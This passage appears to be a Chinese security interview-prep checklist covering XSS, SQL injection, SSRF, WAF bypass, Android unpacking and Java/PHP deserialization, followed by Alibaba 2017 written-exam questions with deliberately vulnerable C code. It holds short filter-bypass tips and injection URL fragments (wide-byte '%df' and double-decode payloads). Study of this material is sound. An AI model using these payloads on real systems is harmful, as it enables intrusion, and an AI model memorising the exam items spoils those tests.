id="描述两个最近的CVE">描述两个最近的CVE</h4><p><strong>被虐经历</strong></p><p><strong>知识清单</strong></p><ul><li><strong>xss防御相关</strong><ul><li><p>编码防御</p><ul><li><p>html实体编码</p></li><li><p>js编码</p></li><li><p>url编码</p></li><li><p><strong>输出点在标签内部应该怎么防御？</strong></p></li><li><p><strong>输出点在标签外部应该怎么防御？</strong></p></li><li><p><strong>三种编码的关系，以及什么地方用到什么编码</strong></p></li><li><p><strong>浏览器解码的过程</strong></p></li><li><p><strong>开启httponly的情况下如何利用XSS漏洞</strong></p></li><li><p>xss输出在注释里怎么利用 （换行符利用）</p></li><li><p>如果页面是gbXXX 如何利用宽字节进行xss利用</p></li><li><p>在xss利用过程中 讲 &lt; 写成 \u003c 可以绕过安全防护 请问这个安全防护的思路是什么</p></li><li><p>XSS防御的7大原则</p></li><li><p>心伤的瘦子XSS教程</p></li><li><p><strong>富文本防御XSS的思路</strong></p></li><li><p>如果 ”javascript“字符串被过滤了，你的绕过思路是什么？</p><ul><li>大小写</li><li>Tab 空格 回车(%0a)</li><li>插入 “/**/” \0 \</li><li>编码</li></ul></li><li><p>CSS中expression表达式可以插入xss吗</p></li><li><p>如果输出点在css style标签中 要注意expression表达式 import等之类</p></li><li><p><strong>XSS编码方案(方案普遍性很高，具体要看业务场景)</strong>(大家自行思考为什么这么做？)</p><ul><li>当输出点出现在HTML标签属性：</li></ul>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; -&gt; &amp;lt;</span><br><span class="line">&gt; -&gt; &amp;gt;</span><br><span class="line">&amp; -&gt; &amp;amp;</span><br><span class="line">&quot; -&gt; &amp;quot;</span><br><span class="line">&apos; -&gt; &amp;#39</span><br></pre></td></tr></table></figure><ul><li>当输出点出现在<script>标签中。这种情况相当危险，不需要考虑xss触发，只需要考虑编写js即可</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    &apos; -&gt; \&apos;;</span><br><span class="line">    &quot; -&gt; \&quot;;</span><br><span class="line">    \ -&gt; \\;</span><br><span class="line">    / -&gt; \/;</span><br><span class="line">    (换行符) -&gt; \n;</span><br><span class="line">    (回车符) -&gt; \r;</span><br><span class="line">```span><br><span class="line"></span><br><span class="line">- 当输出点出现在body中</span><br></pre></td></tr></table></figure><pre><code>  &lt; -&gt; &amp;lt;  &gt; -&gt; &amp;gt;  &amp; -&gt; &amp;amp;  &quot; -&gt; &amp;quot;  ' -&gt; &amp;#39</code></pre>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 当输出点出现在js事件中(onClick=&quot;你的代码&quot;)</span><br></pre></td></tr></table></figure><pre><code>  &lt; -&gt; &amp;lt;  &gt; -&gt; &amp;gt;  &amp; -&gt; &amp;amp;  &quot; -&gt; &amp;quot;  ' -&gt; &amp;#39  \ -&gt; \\;  / -&gt; \/;  (换行符) -&gt; \n;  (回车符) -&gt; \r;</code></pre>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line">             </span><br><span class="line">             - 输出在URL属性中&lt;script src=&quot;你的代码&quot;&gt;</span><br><span class="line">                - URL编码</span><br><span class="line">             </span><br><span class="line">        - **推荐阅读**</span><br><span class="line">            - [防御XSS攻击的七条原则](http://www.freebuf.com/articles/web/9977.html) </span><br><span class="line">            - [深入理解浏览器解析机制和XSS向量编码](https://www.cnblogs.com/b1gstar/p/5996549.html)   </span><br><span class="line"></span><br><span class="line">- **CSRF相关**</span><br><span class="line">    - 只校验Refer可以吗</span><br><span class="line">    - token放在哪里？放在cookie里可以吗？不失效可以吗？</span><br><span class="line">    </span><br><span class="line">- **XXE漏洞相关**</span><br><span class="line">    - XML文件格式</span><br><span class="line">    - XXE漏洞利用的方式</span><br><span class="line">    - XXE漏洞修复方案</span><br><span class="line">    - XXE漏洞</span><br><span class="line">    </span><br><span class="line">- **sql注入漏洞相关**</span><br><span class="line">    - 注入的类型</span><br><span class="line">        - 普通注入(有数据库回显)</span><br><span class="line">            - 数字型注入</span><br><span class="line">            - 字符型注入</span><br><span class="line">            </span><br><span class="line">        - 盲注</span><br><span class="line">            - 什么是盲注</span><br><span class="line">            - 三种类型</span><br><span class="line">                - 基于布尔类型的盲注</span><br><span class="line">                    - left()</span><br><span class="line">                    - substr()</span><br><span class="line">                    - version()</span><br><span class="line">                    - ascii()</span><br><span class="line">                    - user()</span><br><span class="line">                    - database()</span><br><span class="line">                    - @@basedir</span><br><span class="line">                    </span><br><span class="line">                - 基于报错的盲注</span><br><span class="line">                    - double数值类型超出范围</span><br><span class="line">                    - bigint溢出</span><br><span class="line">                    - xpath函数报错注入</span><br><span class="line">                    - extractvalue()</span><br><span class="line">                    - floor() rand() group by</span><br><span class="line">                    </span><br><span class="line">                - 基于时间延时的盲注</span><br><span class="line">                    - sleep()</span><br><span class="line">                    - benchmark()</span><br><span class="line">        </span><br><span class="line">        - 堆叠注入</span><br><span class="line">        </span><br><span class="line">        - order by注入</span><br><span class="line">                    </span><br><span class="line">        </span><br><span class="line">        - 宽字节注入</span><br><span class="line">            - 1.php?id=&apos;1%df反斜杠&apos; (其中反斜杠为%5c,%df%5c在GBK编码下可以变成&apos;蓮&apos; 类似于这个字，那个字我不会打，原谅我没文化) 变成 1.php?id=&apos;1蓮&apos;</span><br><span class="line">            - 将 \&apos; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</span><br><span class="line">            - 宽字节注入的修复方案</span><br><span class="line">            </span><br><span class="line">        - URLDecode二次注入</span><br><span class="line">            - 浏览器编码完之后WebServer会自动解码的，如果后端程序误用urldecode函数会造成此类情况(1.php?id=1%2527==&gt;(WebServer)1.php?id=1%27==&gt;(urldecode)1.php?id=1&apos;)</span><br><span class="line">        </span><br><span class="line">    - 检查注入的思路</span><br><span class="line">        - 通过加单引号 双引号看看是否有报错。</span><br><span class="line">            - 有报错（不一定有注入）：</span><br><span class="line">                - 通过拼接语句来进行状态判断</span><br><span class="line">                    - and ,or</span><br><span class="line">                    </span><br><span class="line">            - 没有报错（有可能是盲注）：</span><br><span class="line">                - 如果关闭错误回显的话 基于报错注入就不可能了。</span><br><span class="line">                - 构造语句利用延时注入和联合注入进行攻击</span><br><span class="line">                    - sleep benchmark extractvalue</span><br><span class="line">                    </span><br><span class="line">        - 看状态码(正常的话是200 注入的话可能会存在500 302等)</span><br><span class="line">        </span><br><span class="line">        - 特殊注入需要额外观察：</span><br><span class="line">            - 宽字节注入</span><br><span class="line">            - url二次注入</span><br><span class="line">            </span><br><span class="line">    - mysql注释</span><br><span class="line">        - &apos;--&apos;</span><br><span class="line">        - &apos;#&apos;</span><br><span class="line">        - /* */ 多行注释</span><br><span class="line">    </span><br><span class="line">    - 掌握</span><br><span class="line">    - 方案(参数化查询会有问题吗？)</span><br><span class="line">    - ORM</span><br><span class="line">    - 如果检测被拦截了怎么绕过（比如sleep被waf拦了）</span><br><span class="line">    - Mysql的提权都有哪些，UDF提权的原理。</span><br><span class="line">    - Sqlmap原理</span><br><span class="line">    - 在SSM框架中，Mybatis注入是什么情况造成的？#&#123;&#125;,$&#123;&#125;有什么区别，mybaties的预编译是如何实现的。</span><br><span class="line">    - 什么情况下Mybatis必须使用$&#123;&#125;,为什么只能使用$&#123;&#125;。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">- **CRLF注入**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">- **SSRF**</span><br><span class="line">    - 说一个容易出现SSRF漏洞的场景</span><br><span class="line">    - 如果过滤了以http开头的协议怎么绕过</span><br><span class="line">    - 利用DNS重绑定来绕过SSRF的原理。</span><br><span class="line">    - SSRF的地方也是可以跟伪协议在一起利用的。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">- **Waf绕过**</span><br><span class="line">    - 绕过的本质是什么，是在寻找2个或者多个集合之间特性的差异。利用这些差异点进行绕过。</span><br><span class="line">    - 架构层绕过WAF</span><br><span class="line">    - 资源限制角度绕过WAF</span><br><span class="line">    - 协议层面绕过WAF的检测</span><br><span class="line">    - 规则层面的绕过</span><br><span class="line">        - SQL注入</span><br><span class="line">            - 注释符绕过</span><br><span class="line">            - 空白符绕过</span><br><span class="line">            - 函数分隔符</span><br><span class="line">            - 编码相关</span><br><span class="line">        - 文件包含</span><br><span class="line">            - 相对路径 </span><br><span class="line">            - 绝对路径</span><br><span class="line">    </span><br><span class="line">- **DDOS防御相关**</span><br><span class="line">    - DDOS攻击的类型</span><br><span class="line">    - DDOS云防御的方案</span><br><span class="line">    - DDOS反射攻击基于的协议？为什么基于这个协议？</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">- **android逆向相关**</span><br><span class="line">    - 脱壳的原理</span><br><span class="line">    - 如何查壳</span><br><span class="line">    - smali语法</span><br><span class="line">    - davilk指令</span><br><span class="line">    - 如何防打包</span><br><span class="line">    - 如何防签名校验</span><br><span class="line">    - Android App加固原理分析(说一个加固的思路)</span><br><span class="line">    - 防御思路</span><br><span class="line">        - 对抗静态分析</span><br><span class="line">            - 代码混淆技术 ProGuard</span><br><span class="line">            - NDK保护</span><br><span class="line">            - 壳</span><br><span class="line">        - 对抗动态调试 </span><br><span class="line">            - android:debuggable=&quot;false&quot;，让程序不可调试</span><br><span class="line">            - android.os.Debug.isDebuggerConnected()</span><br><span class="line">            - 检测模拟器</span><br><span class="line">        - 防止重编译</span><br><span class="line">            - 检查签名 Eclipse自带的调试版密钥文件生成的apk文件的hash值,与上面的函数获取的hash比较</span><br><span class="line">            - 检测Dex文件的Hash</span><br><span class="line">    - android 反调试原理</span><br><span class="line">        - 检测/proc/pid/status文件中的tracePID 如果不为0的情况，就是说明有程序正在进行反调试，该值为调试的进程的pid。一般在native层会fork一个子进程来循环的读取/proc/pid/status文件中的tracePID字段，如果不为0，直接exit</span><br><span class="line">    - 绕过反调试的思路</span><br><span class="line">        - 在JNI_ONLOAD下断点</span><br><span class="line">        - 修改android内核。</span><br><span class="line">    </span><br><span class="line">    - android加壳</span><br><span class="line">        - 说一说每一代壳的主要技术和思路。</span><br><span class="line">            - 网络上对android壳的发展历史有着多个版本，有的是认为发展到现在经历了4代壳，有的则认为是5代壳。不过这些都不重要，相关的技术和思路都提现出来。这里我以5代为版本说一下我自己的理解。</span><br><span class="line">                - 一代壳最大的特点是动态加载，思路比较简单，就是在静态的情况下不让你看见整个dex文件，然后主动运行壳的入口，然后自定义类加载器进行加载，运行。这种脱壳的核心思路就是在内存中找到一个比较合适的时机，对dex文件进行dump。比如dvmDexFileOpenPartial函数下断点，这个函数是优化dex文件的函数，第一个参数就是dex文件指针。</span><br><span class="line">                </span><br><span class="line">                - 二代壳主要是实现了不落地加载。这个不落地是指文件没有流入文件系统，直接在内存中动态生成，但是由于dex文件依然是成片存在于内存中的，所以核心思路还是在合适的时机dump内存即可。由于不同厂商分别不同实现了相关函数，或者对一代壳的dvmDexFileOpenPartial函数进行了相应的保护。一般二代壳在mmap(),memcpy()等下断点依旧可以dump出dex文件。</span><br><span class="line">                </span><br><span class="line">                - 三代壳主要是在前2代的基础上增加了代码抽取。这样在你面前呈现出来的代码很多函数都是空的。那是因为在此之前你的dex文件中很多关于method_id部分中代码用00来填充，真正的代码隐藏在别处，在这个函数被执行之前，主动还原被填充的00 ins部分。这种壳脱壳可以借鉴dexhunter工具。</span><br><span class="line">                </span><br><span class="line">                - VMP壳和Ollvm混淆 目前比较领先的加固方案。</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">        - dex文件的加载流程:</span><br><span class="line">            - 见我的另外一篇分析文章。 从android源码看脱壳。 (https://tiaotiaolong.net/2019/07/05/从android源码看脱壳/)</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">- **浏览器安全**</span><br><span class="line">    - https协议握手过程</span><br><span class="line">    - burp 中间人攻击的原理</span><br><span class="line">    - 分别说3个对称加密 非对称加密 哈希算法 </span><br><span class="line">    - CSP</span><br><span class="line">    - 除了公私钥密码加密体系还有其他可以确保传输安全的吗？</span><br><span class="line">    - 简述一下同源策略</span><br><span class="line">    - 同源策略下如何从a.baidu.com 去获取 www.baidu.com的cookie</span><br><span class="line">    - 网页木马的工作原理</span><br><span class="line">    - 同源策略下如何解决跨域请求 (分别说说原理和局限性)</span><br><span class="line">        - document.domain </span><br><span class="line">        - jsonp</span><br><span class="line">        - CORS</span><br><span class="line">    - cookie遵守同源策略吗？(其实是不完全遵守的)。</span><br><span class="line">    - jsonP安全</span><br><span class="line">    - CORS的整个流程能说一下吗？</span><br><span class="line">    - CORS跟CSRF之前有什么联系吗？能把这个问题想明白，前端跨域这块算是可以了。</span><br><span class="line">    </span><br><span class="line">- **PHP安全**</span><br><span class="line">    - PHP的那些魔法函数造成的安全问题(当然了，你也可以说程序员不了解php的语言特性 哈哈哈哈)</span><br><span class="line">        我个人觉得这些魔法函数是代码审计的基础，这也是为什么代码审计都喜欢挑php来捏，语言特性太强大。(这块的东西参考一个git吧 https://github.com/bowu678/php_bugs)</span><br><span class="line">        包括不限于 </span><br><span class="line">        - 弱比较==</span><br><span class="line">        - strops()</span><br><span class="line">        - intval()</span><br><span class="line">        - preg_replace /e问题</span><br><span class="line">        - extract变量覆盖</span><br><span class="line">        - 当然了 变量覆盖的点还有 $$ 等</span><br><span class="line">        - 数字开头字符串和数字比较。</span><br><span class="line">        - 00截断(这里我列的肯定是不全，这块我准备慢慢更新吧)截断应该在5.3之前把。</span><br><span class="line">        - php命令注入怎么防御</span><br><span class="line">        - escapeshellcmd和escapeshellargs2个函数一起使用会造成什么安全问题。</span><br><span class="line">    - thinkphp SQL注入的分析过程(3.2版本中的find(),delete(),select()分析一下这几个函数，跟踪一下)(我分析的一处https://tiaotiaolong.net/2019/07/19/Thinkphp3.2-SQL注入分析/)收录到我的git项目[tiaoVulenv](https://github.com/tiaotiaolong/tiaoVulenv)中</span><br><span class="line"></span><br><span class="line">    - php fpm未授权访问</span><br><span class="line">    - php-fpm跟nginx搭配的情况下，可以通过nginx的特殊配置造成代码执行。</span><br><span class="line">    - thinkphp 命令执行的分析过程(5.x的命令执行) </span><br><span class="line">    - php的反序列化漏洞，和序列化中的那几个魔法函数。unserialize()</span><br><span class="line">    - webshell变形(可以利用php的特性)，那么问题来了，有什么好的检测方法或者思路可以杜绝任意的php变形webshell？行为检测？还是其他方案。</span><br><span class="line">    - phpinfo解读 从泄露的phpinfo中你能解读写什么东西?(以前渗透测试时候基本都忽略了，下面有篇文章  http://tiandiwuji.top/posts/23527/)</span><br><span class="line">    - Joomla 的反序列化 这个比较经典 涉及到了php构造对象注入。</span><br><span class="line">    - php伪协议</span><br><span class="line">    - typecho反序列化漏洞，这个算是一个老洞了，但是我觉得这个漏洞利用魔法函数触发可以说是较为经典。就算是告诉我这个漏洞点，我也找不到利用链啊。[Typecho反序列化漏洞分析](https://www.anquanke.com/post/id/155306)</span><br><span class="line">    </span><br><span class="line">       </span><br><span class="line">- **Java家族安全**</span><br><span class="line">    - 著名java反序列化漏洞 Apache的common Collection组件里的调用链的原理和利用思路(这个文章特别多) 后续的很多软件的漏洞都是因为使用了这个apache的组件导致的。我写了一个关于我的理解(https://tiaotiaolong.net/2019/07/19/Apache-Common组件反序列化原理/)同时也收录到我自己的git项目[tiaoVulenv](https://github.com/tiaotiaolong/tiaoVulenv)里。</span><br><span class="line"></span><br><span class="line">    - 关于java反序列化一般都是怎么修复的，修复思路是什么？黑名单？</span><br><span class="line">    - fastjson 反序列化的问题 关于fastjson我写了一个连载，在博客里，同时也在我自己的git项目[tiaoVulenv](https://github.com/tiaotiaolong/tiaoVulenv)里。</span><br><span class="line">    - shiro 认证模块反序列化漏洞 大致原理以及利用方式。shiro在自己并不是采用class.forname()的方式进行加载的，导致无法支持数组类型的装载，在调用链上有依赖性。</span><br><span class="line">    - shiro的密码学安全问题，PaddingOracle安全问题。</span><br><span class="line">    - Spring 安全 jndi注入和其他好多次的SpEL表达式注入，针对表达式注入有什么好的思路修复吗。</span><br><span class="line">    - Struts2 安全 我觉得和spring表达式安全问题差不多，逐渐被淘汰，可以先去理解SpEL。</span><br><span class="line">    - JBoss 安全 </span><br><span class="line">    - Tomcat 安全 put类型文件上传 和 最近新出的GhostCat</span><br><span class="line">    - WebLogic安全 原理 利用方法  本质问题是java的xmldecode的反序列化问题。这个调试起来比较有难度！</span><br><span class="line">    - jenkins 安全问题</span><br><span class="line">    - ysoserial你真的会了吗？里面几十种调用链，光commoncollection系列目前就7个，可以好好的用idea调试一下ysoserial，你会发现ysoserial的调用链太精彩了。</span><br><span class="line">    - JVM学习 可以参考深入理解Java虚拟机。学习JVM主要对我们理解类加载器装载类的过程有很大帮助，对反序列化的理解的帮助是巨大的。</span><br><span class="line">    - java动态代理，反射，spring的IOC。</span><br><span class="line">    - springboot快速创建一个简单的增删改查项目，使用maven构建，有助于我们复现漏洞环境，总不能依赖于docker吧。</span><br><span class="line">    - SSM框架可以不会写，但是要会看懂代码之间的逻辑运行关系，会读懂每个xml文件，便于审计，开发的话可以直接使用springboot。</span><br><span class="line">    - 利用RMI JNDI注入来完成命令执行的模式是怎样的，了解一下RMI协议，说说rmi的调用过程。</span><br><span class="line">    - JDK7u21 调用链 https://tiaotiaolong.net/2020/03/15/JDK7U21调用链/</span><br><span class="line">    - RMI和LDAP攻击在java的高版本是有防御机制的，那如何绕过该防御机制。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">- **企业安全相关**</span><br><span class="line">    - Redis主从命令执行攻击的原理。</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">- **Python**</span><br><span class="line">    - python参数传递是依靠值传递还是引用传递？</span><br><span class="line">        - 传入可变对象和传入不可变对象的结果一样吗？ 为什么</span><br><span class="line">    - python lambda表达式</span><br><span class="line">    - python 闭包</span><br><span class="line">    - python 装饰器</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">- **应急响应 or 红蓝对抗**</span><br><span class="line">    - php扩展门 </span><br><span class="line">    - pwnginx后门 如果机器存在这种门，该怎么发现它？</span><br><span class="line">    - 自己纯手动搭建一次nginx,apache,tomcat。做到了解所有目录结构和配置文件。</span><br><span class="line">    - apache的扩展后门都有哪些？可以自己动手搭建一下，那这种后门的缺点是什么？</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">- **安全开发**    </span><br><span class="line">    - 利用openresty写一个简易版本的WAF。谈谈基于规则检测恶意流量的缺点和优点，那如果是基于算法呢？</span><br><span class="line">    - 利用Celery实现自己的扫描器，说说扫描器的思路。</span><br><span class="line">    - 如何设计一款白盒扫描器，可以定位到漏洞点和追踪数据流向。</span><br><span class="line">    - 如果让你设计一个简单的web框架，你如何设计。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">- **开放问题** </span><br><span class="line">    - XXE跟SSRF你觉得有什么关系吗，相同点跟不同点都可以说说。</span><br><span class="line">    # 2017 阿里巴巴 春招 笔试真题</span><br><span class="line"></span><br><span class="line">    | 公司 | 阿里巴巴            |</span><br><span class="line">    |:-----|:-------------------|</span><br><span class="line">    | 时间 | 2017.04.24晚        |</span><br><span class="line">    | 形式 | 网页, 在线, 有摄像头 |</span><br><span class="line">    | 长度 | 18题, 90分钟        |</span><br><span class="line">    | 备注 | 每个人题目各不一样   |</span><br><span class="line"></span><br><span class="line">    整理自群文件(306335642)  </span><br><span class="line">    题的编号是非官方的, 仅供讨论方便</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ## 题目</span><br><span class="line"></span><br><span class="line">    * 2017_ali_spring_1</span><br></pre></td></tr></table></figure></li></ul><p><a href="http://www.vuln.xxx/show_pic?image=http://image.test.com/1.jpg">www.vuln.xxx/show_pic?image=http://image.test.com/1.jpg</a><br>上述URL可能引起的安全问题有哪些？详细阐述下，如果存在该漏洞会产生什么危害？通常情况下，你会如何利用？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_2</span><br></pre></td></tr></table></figure><p>TCP和UDP协议的区别？路由器、交换机、防火墙等网络设备在配置ACL时应注意哪些问题？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_3</span><br></pre></td></tr></table></figure><p>以下c代码是否包含安全漏洞，如存在漏洞，请说出漏洞如何触发？<br>bool funcA(unsigned int cbSize){<br>if (cbSize &lt; 1024) {<br>char *buf = new char[cbSize-1];<br>memset(buf,0,cbSize-1);<br>delete buf;<br>return true;<br>}<br>else<br>return false;<br>}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_4</span><br></pre></td></tr></table></figure><p>代码所执行的环境是Linux kalilocal 4.9.0-kali1-amd64 (2017-01-30) x86_64 GNU/Linux<br>如果编译命令是gcc test.c -o test ，请你写出可以获取secret 的所有方法</p><p>#include &lt;fcntl.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;stdio.h&gt;<br>char secret[10];<br>int create_secret(){<br>int fd;<br>fd = open(“secret”,O_RDONLY);<br>read(fd,secret,10);<br>return 0;<br>}<br>int main(){<br>char format[10] = “%s”;<br>char username[10];<br>create_secret();<br>scanf(format,username);<br>printf(format,username);<br>return 0;<br>}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_5</span><br></pre></td></tr></table></figure><p>现有办公网、生产网各一份DNS服务器采集的DNS日志，包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。<br>根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_6</span><br></pre></td></tr></table></figure><p>如何通过数据分析的方式检测出一个系统账户被非其所有人使用</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_7</span><br></pre></td></tr></table></figure><p>以下是一份iOS crash日志，这份日志里面有哪些问题？应该如何分析？</p><p>Incident Identifier: 12F51135-7348-4683-9CF2-2285669EAB89<br>CrashReporter Key:   670f3f77d42a1d3e752f10392bb38290eebf5af9<br>Hardware Model:      iPad4,1<br>Version:             1.0.0.02220012 (1.0.0)<br>Code Type:           ARM-64 (Native)<br>Parent Process:      launchd [1]<br>Exception Type:  EXC_BAD_ACCESS (SIGBUS)<br>Exception Subtype: KERN_PROTECTION_FAILURE at 0x000000010a463500<br>Triggered by Thread:  0</p><p>Filtered syslog:<br>None found</p><p>Thread 0 name:  